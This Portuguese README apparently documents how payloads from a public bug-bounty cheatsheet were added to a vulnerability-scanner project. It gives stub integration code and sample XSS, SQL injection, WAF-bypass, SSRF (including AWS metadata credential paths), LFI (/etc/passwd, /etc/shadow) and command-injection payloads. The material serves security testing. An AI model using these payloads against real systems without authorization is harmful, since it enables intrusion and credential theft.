# Integração com BugBounty Cheatsheet

Este documento descreve como os payloads e técnicas do repositório [EdOverflow/bugbounty-cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet) foram integrados ao seu projeto.

## 📦 O que foi adicionado

### 1. **app/payloads.py**
Arquivo centralizado com todos os payloads comentados do bugbounty-cheatsheet, organizados por tipo de vulnerabilidade:

- **XSS**: Payloads básicos, bypasses Chrome/Safari, WAF bypasses, polyglots
- **SQLi**: Injeção SQL básica, UNION-based, blind, bypasses Akamai
- **SSRF**: Localhost, AWS metadata, IPv6, wildcard DNS, handlers exóticos
- **LFI**: Bypass de filtros, arquivos comuns, logs
- **Open Redirect**: Payloads básicos, codificações, parâmetros comuns
- **RCE**: Comandos básicos, bypasses de shell, Shellshock, Werkzeug debugger

### 2. **app/payloads_integration.py**
Módulo com funções auxiliares para usar os payloads nos seus scanners:

```python
from app.payloads_integration import (
    get_xss_test_payloads,
    get_sqli_test_payloads,
    get_ssrf_test_payloads,
    get_lfi_test_payloads,
    get_redirect_test_payloads,
    get_rce_test_payloads,
)

# Exemplo: obter payloads XSS
xss_payloads = get_xss_test_payloads(bypass_waf=True)

# Exemplo: obter payloads SSRF
ssrf_localhost = get_ssrf_test_payloads(target_type="localhost")
ssrf_aws = get_ssrf_test_payloads(target_type="aws_metadata")
```

### 3. **cheatsheet-ref/**
Clone completo do repositório original para referência rápida.

## 🚀 Como usar nos seus scanners

### Exemplo 1: Integrar com SSRF Scanner

```python
from app.payloads_integration import get_ssrf_test_payloads, get_ssrf_parameters

# No seu ssrf_scanner.py
def enhanced_ssrf_scan(target_url):
    payloads = get_ssrf_test_payloads(target_type="aws_metadata")
    parameters = get_ssrf_parameters()
    
    # Use os payloads nos seus testes
    for param in parameters:
        for payload in payloads:
            # Teste o payload no parâmetro
            pass
```

### Exemplo 2: Integrar com scanner de XSS

```python
from app.payloads_integration import get_xss_test_payloads, test_xss_in_parameters

# Testar XSS em múltiplos parâmetros
results = test_xss_in_parameters(
    base_url="https://target.com/search",
    parameters=["q", "search", "query"]
)
```

### Exemplo 3: Integrar com scanner de SQL Injection

```python
from app.payloads_integration import (
    get_sqli_test_payloads,
    test_sqli_in_parameters
)

# Testar SQLi com diferentes técnicas
basic_payloads = get_sqli_test_payloads(technique="basic")
union_payloads = get_sqli_test_payloads(technique="union_based")
blind_payloads = get_sqli_test_payloads(technique="blind")

# Usar nos seus testes
for payload in union_payloads:
    # Teste o payload
    pass
```

## 📚 Referência dos Payloads

### XSS - Cross-Site Scripting

**Payloads básicos:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**Bypass de WAF Akamai/Kona:**
```html
\');confirm(1);//
```

**Chrome XSS-Auditor Bypass:**
```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) />
```

### SQLi - SQL Injection

**Injeção Básica:**
```sql
' OR '1'='1
' OR '1'='1'--
```

**Bypass Akamai:**
```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

### SSRF - Server-Side Request Forgery

**Localhost:**
```
http://127.0.0.1/
http://[::1]/
http://169.254.169.254/latest/meta-data/
```

**AWS Metadata:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### LFI - Local File Inclusion

**Bypass de Filtros:**
```
../\
..\/
/%5c..
```

**Arquivos Comuns:**
```
../../etc/passwd
../../etc/shadow
../../windows/win.ini
```

### Open Redirect

**Básico:**
```
//google.com
//www.google.com
///google.com
```

**Em Parâmetros:**
```
?url=http://google.com
?next=http://google.com
?redirect=http://google.com
```

### RCE - Remote Code Execution

**Shellshock:**
```bash
() { :;}; echo vulnerable
```

**Bypass de Espaços:**
```
{ls,}
cat /e?c/p?ss??
```

## 🔗 Links Úteis

- [EdOverflow/bugbounty-cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## 📝 Próximos Passos

Para otimizar o uso dos payloads no seu projeto:

1. **Integrar gradualmente com cada scanner** - Comece com um scanner (ex: SSRF) e adicione suporte para payloads
2. **Criar cache de resultados** - Evite testar mesmos payloads múltiplas vezes
3. **Adicionar detecção inteligente** - Analise respostas para detectar vulnerabilidades com base em padrões
4. **Manter payloads atualizados** - Sincronize periodicamente com o repositório original
5. **Criar regras customizadas** - Adicione payloads específicos para aplicações conhecidas

## 📄 Licença

Os payloads foram adaptados de [EdOverflow/bugbounty-cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet) (CC-BY-SA-4.0).
